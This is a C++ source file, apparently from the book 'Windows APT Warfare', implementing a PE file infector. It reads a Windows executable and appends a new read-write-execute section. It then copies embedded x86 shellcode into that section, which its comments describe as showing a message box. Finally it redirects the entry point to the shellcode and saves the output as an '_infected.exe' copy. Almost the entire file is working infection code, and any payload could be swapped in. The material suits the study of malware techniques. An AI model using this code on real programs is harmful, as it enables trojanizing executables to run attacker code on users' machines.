/**
 * PE_Patcher.cpp
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
 // Comment by dinlon5566
 
#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996)

 /* Title:    	   User32-free Messagebox Shellcode for All Windows
  * Author:		   Giuseppe D'Amore
  * Size: 		   113 byte (NULL free)
  */
char x86_nullfree_msgbox[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

bool readBinFile(const char fileName[], char** bufPtr, DWORD& length) {
	if (FILE* fp = fopen(fileName, "rb")) {
		fseek(fp, 0, SEEK_END);
		length = ftell(fp);
		*bufPtr = new char[length + 1];
		fseek(fp, 0, SEEK_SET);
		fread(*bufPtr, sizeof(char), length, fp);
		return true;
	}
	return false;
}

int main(int argc, char** argv) {
	if (argc != 2) {
		puts("[!] usage: ./PE_Patcher.exe [path/to/file]");
		return 0;
	}

	char* buff; DWORD fileSize;
	if (!readBinFile(argv[1], &buff, fileSize)) {
		puts("[!] selected file not found.");
		return 0;
	}

// catch NT hdr adr
#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))
//catch Section hdr adr
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))
// get how align uses at data
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))

	puts("[+] malloc memory for outputed *.exe file.");

	// get align in section/nt;
	// set size of new exe
	size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment,
		fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment,
		finalOutSize = fileSize + P2ALIGNUP(sizeof(x86_nullfree_msgbox), fileAlign);

	// create new space
	char* outBuf = (char*)malloc(finalOutSize);
	// copy orgin file to new space
	memcpy(outBuf, buff, fileSize);

	puts("[+] create a new section to store shellcode.");

	// address of new section hdr
	auto sectArr = getSectionArr(outBuf);
	//get last adr of section
	PIMAGE_SECTION_HEADER lastestSecHdr = &sectArr[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1];
	// new add begin section adr
	PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1;

	//set name
	memcpy(newSectionHdr->Name, "newBlock", 9);
	//set vritualsize = sizeof shellcode after align
	newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), sectAlign);
	//set address = last hdr + it size
	newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign);
	// size of raw data = shellcode
	newSectionHdr->SizeOfRawData = sizeof(x86_nullfree_msgbox);
	// after last rawdata
	newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData;
	// set section block to "rwx"
	newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	//add sum of Section
	getNtHdr(outBuf)->FileHeader.NumberOfSections += 1;


	puts("[+] pack x86 shellcode into new section.");
	// set shell code to address
	memcpy(outBuf + newSectionHdr->PointerToRawData, x86_nullfree_msgbox, sizeof(x86_nullfree_msgbox));

	puts("[+] repair virtual size. (consider *.exe built by old compiler)");
	//reset all block virtualSize
	for (size_t i = 1; i < getNtHdr(outBuf)->FileHeader.NumberOfSections; i++)
		sectArr[i - 1].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - 1].VirtualAddress;

	puts("[+] fix image size in memory.");
	//fix OpHdr imageSize to sec[0]~sec[end].last adr
	getNtHdr(outBuf)->OptionalHeader.SizeOfImage =
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].VirtualAddress +
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].Misc.VirtualSize;

	puts("[+] point EP to shellcode.");
	// set entry point to new section
	getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress;

	// output name 123.exe -> 123_infected.exe
	char outputPath[MAX_PATH];
	memcpy(outputPath, argv[1], sizeof(outputPath));
	strcpy(strrchr(outputPath, '.'), "_infected.exe");


	FILE* fp = fopen(outputPath, "wb");
	fwrite(outBuf, 1, finalOutSize, fp);
	fclose(fp);

	printf("[+] file saved at %s\n", outputPath);
	puts("[+] done.");
	return 0;
}
